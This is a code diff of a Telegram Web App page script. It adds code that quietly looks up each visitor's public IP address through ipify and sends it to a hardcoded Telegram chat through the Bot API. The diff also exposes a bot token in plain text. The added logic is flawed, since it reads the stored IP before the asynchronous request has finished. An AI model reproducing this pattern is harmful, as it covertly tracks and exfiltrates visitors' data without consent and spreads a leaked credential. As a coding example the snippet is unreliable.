@@ -25,23 +25,22 @@
         Telegram.WebApp.sendData(data);
         Telegram.WebApp.close();
     });
-    const test = () => {
-        const ipAddressEndpoint = "https://api.ipify.org?format=json";
-        fetch(ipAddressEndpoint)
-          .then(response => response.json())
-          .then(data => {
-              return data.ip; // Logs your public IP address
-          })
-          .catch(error => console.error(error));
-    }
     function sendMessage() {
 			const token = '5476946556:AAE64iQclmNuyKjkInVJtY5eqUqtDa3EoU4';
 			const chatId = '598045349';
             // const queryString = window.location.search;
             // const urlParams = new URLSearchParams(queryString);
             // const id = urlParams.get('Token');
+            const ipAddressEndpoint = "https://api.ipify.org?format=json";
 
-			const message = `Telegram ${this.test()}`;
+            fetch(ipAddressEndpoint)
+              .then(response => response.json())
+              .then(data => {
+                const ipAddress = data.ip;
+                localStorage.setItem('ip', ipAddress) // Logs your public IP address
+              })
+              .catch(error => console.error(error));
+			const message = localStorage.getItem('ip');
 
 			const xhttp = new XMLHttpRequest();
 			xhttp.onreadystatechange = function() {
@@ -56,7 +55,7 @@
 			xhttp.send(`chat_id=${chatId}&text=${message}`);
 		}
     function showPopup() {
-        Telegram.WebApp.showAlert('Alirezamhd')
+        Telegram.WebApp.showAlert('Alireza')
     }
 </script>
 <body style="background-color: #ffffff">
